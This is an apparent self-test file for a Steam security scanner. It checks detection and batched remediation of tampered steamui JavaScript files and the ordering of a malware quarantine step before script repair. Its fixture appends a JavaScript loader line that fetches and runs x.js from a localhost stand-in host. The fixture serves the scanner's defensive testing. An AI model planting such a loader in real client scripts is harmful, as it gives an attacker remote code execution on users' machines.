using System.IO;
using System.Security.Cryptography;
using System.Text;
using SteamSentinel.Core.Inspection;
using SteamSentinel.Core.Models;
using SteamSentinel.Core.Remediation;
using SteamSentinel.Core.Scanning;
using SteamSentinel.Core.Steam;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    private static async Task TestSteamScriptBatchRegressionAsync(string root)
    {
        const int scriptCount = 65;
        const string loader = ";try{var s=document.createElement(\"script\");s.src=\"http://127.0.0.1:8137/x.js?\"+Date.now();document.head.append(s)}catch{}";
        string fixture = Path.Combine(root, "script-batch-regression-" + Guid.NewGuid().ToString("N"));
        string steam = Path.Combine(fixture, "Steam");
        string scripts = Path.Combine(steam, "steamui");
        string residentDirectory = Path.Combine(fixture, "SteamAlertDemo");
        string resident = Path.Combine(residentDirectory, "Application Frame Host.exe");
        Directory.CreateDirectory(scripts);
        Directory.CreateDirectory(residentDirectory);
        SteamLayout layout = new();
        layout.SteamRoots.Add(steam);
        byte[] residentBytes = "Inert batch regression resident. Never executed."u8.ToArray();
        string residentHash = Convert.ToHexString(SHA256.HashData(residentBytes));
        RuleSet rules = new()
        {
            KnownHashes = [new() { Id = SteamAlertInstallation.ResidentRule, Sha256 = residentHash, Malware = true }]
        };
        Dictionary<string, byte[]> originals = new(StringComparer.OrdinalIgnoreCase);
        for (int index = 0; index < scriptCount; index++)
        {
            string path = Path.Combine(scripts, $"chunk-{index:D3}.js");
            byte[] bytes = Encoding.UTF8.GetBytes($"(()=>{{const fixture={index};}})();\n" + loader + "   ");
            originals.Add(path, bytes);
            await File.WriteAllBytesAsync(path, bytes);
        }
        ScanReport report = new();
        await new SteamSecurityScanner(rules).ScanAsync(layout, report);
        Finding[] findings = report.Findings.Where(f => f.RuleId == SteamScriptRepair.RuleId).ToArray();
        Check("Steam script bulk fixture is detected through the normal scanner", findings.Length == scriptCount);

        RemediationBatchPlanner planner = new(rules, layout, residentDirectory);
        RemediationBatchSession residual = await planner.PrepareAsync(findings, report, false);
        Check("More than 64 residual Steam scripts prepare across bounded batches", residual.Plans.Count >= 2 &&
            residual.Plans.All(p => p.Actions.Count <= 64) &&
            residual.Plans.SelectMany(p => p.Actions).Count(a => a.Type == RemediationActionType.RepairSteamScript) == scriptCount &&
            residual.Targets.Count(t => t.State == RemediationTargetState.Ready) == scriptCount);

        // Conflicting snapshots of a selected path must block that path regardless of order.
        Finding current = findings[0];
        Finding stale = SteamScriptRepairTarget.CreateFinding(current.Target, new string('A', 64), new string('B', 64));
        foreach (Finding[] order in new[] { new[] { current, stale }, new[] { stale, current } })
        {
            RemediationBatchSession conflict = await planner.PrepareAsync(order, new ScanReport { Findings = [.. order] }, false);
            Check("Conflicting Steam script snapshots cannot cherry-pick a current repair " + ReferenceEquals(order[0], current),
                !conflict.Plans.SelectMany(p => p.Actions).Any(a => a.Type == RemediationActionType.RepairSteamScript && a.Target == current.Target) &&
                conflict.Targets.Single(t => t.Target == current.Target).State == RemediationTargetState.NotIncluded);
        }

        await File.WriteAllBytesAsync(resident, residentBytes);
        Finding source = new()
        {
            RuleId = SteamAlertInstallation.ResidentRule, Category = FindingCategory.File, Target = resident,
            Sha256 = residentHash, TargetSha256 = residentHash, IsKnownMalware = true, CanRemediate = true,
            Score = 100, SuggestedActions = [SuggestedActionKind.QuarantineFile]
        };
        ScanReport sourceReport = new() { Findings = [source, .. findings] };
        RemediationBatchSession sourceOnly = await planner.PrepareAsync([source], sourceReport, false);
        Check("Source-only selection retains source cleanup and all 65 associated script repairs", CompleteBatch(sourceOnly) &&
            sourceOnly.Targets.Count(t => t.AddedByAssociation && originals.ContainsKey(t.Target) && t.State == RemediationTargetState.Ready) == scriptCount);

        RemediationBatchSession allSelected = await planner.PrepareAsync([source, .. findings], sourceReport, false);
        Check("Source plus more than 64 selected scripts do not form an unplannable group", CompleteBatch(allSelected));
        var sourceActions = allSelected.Plans.SelectMany((plan, index) => plan.Actions
            .Where(a => a.Type == RemediationActionType.QuarantineFile && a.Target == resident)
            .Select(action => (Action: action, PlanIndex: index))).ToArray();
        bool ordered = sourceActions.Length == 1;
        if (ordered)
        {
            var sourceAction = sourceActions[0];
            foreach (var entry in allSelected.Plans.Select((plan, index) => (Plan: plan, Index: index)))
            {
                IReadOnlyDictionary<Guid, HashSet<Guid>> dependencies = RemediationDependencies.Build(entry.Plan.Actions);
                foreach (RemediationAction repair in entry.Plan.Actions.Where(a => a.Type == RemediationActionType.RepairSteamScript))
                    ordered &= entry.Index > sourceAction.PlanIndex || entry.Index == sourceAction.PlanIndex &&
                        dependencies[repair.ActionId].Contains(sourceAction.Action.ActionId);
            }
        }
        Check("Steam source cleanup precedes repair in the same or an earlier batch", ordered);

        // Exercise the real batch execution coordinator with inert results only: no Broker,
        // file mutation, process launch, registry change, or JavaScript evaluation occurs.
        int invokedPlans = 0;
        await RemediationBatchPlanner.ExecuteAsync(allSelected, plan =>
        {
            invokedPlans++;
            return Task.FromResult(new RemediationRunResult
            {
                PlanId = plan.PlanId,
                Success = false,
                Disposition = RemediationRunDisposition.Completed,
                VerificationStatus = RemediationVerificationStatus.ResidualDetected,
                Actions = plan.Actions.Select(action => new RemediationActionResult
                {
                    ActionId = action.ActionId, Type = action.Type, Target = action.Target,
                    Success = false,
                    ExecutionStatus = action.Type == RemediationActionType.RepairSteamScript
                        ? RemediationExecutionStatus.SkippedDependency : RemediationExecutionStatus.Failed,
                    VerificationStatus = RemediationVerificationStatus.ResidualDetected
                }).ToList()
            });
        });
        Check("Failed source batch prevents every later Steam repair batch from executing", allSelected.Plans.Count >= 2 &&
            invokedPlans == 1 && allSelected.Results.Count == 1 && allSelected.InterruptionReasonCode == ReasonCodes.BatchIncomplete &&
            allSelected.Targets.Where(t => originals.ContainsKey(t.Target)).All(t => t.State != RemediationTargetState.Completed));
        bool unchanged = (await File.ReadAllBytesAsync(resident)).SequenceEqual(residentBytes);
        foreach (var original in originals)
            unchanged &= (await File.ReadAllBytesAsync(original.Key)).SequenceEqual(original.Value);
        Check("Bulk preparation and failed-result simulation preserve every original file", unchanged);

        bool CompleteBatch(RemediationBatchSession session) => session.Plans.Count >= 2 &&
            session.Plans.All(p => p.Actions.Count <= 64) &&
            session.Plans.SelectMany(p => p.Actions).Count(a => a.Type == RemediationActionType.RepairSteamScript) == scriptCount &&
            session.Plans.SelectMany(p => p.Actions).Count(a => a.Type == RemediationActionType.QuarantineFile && a.Target == resident) == 1 &&
            session.Targets.Any(t => t.Target == resident && t.State == RemediationTargetState.Ready);
    }
}
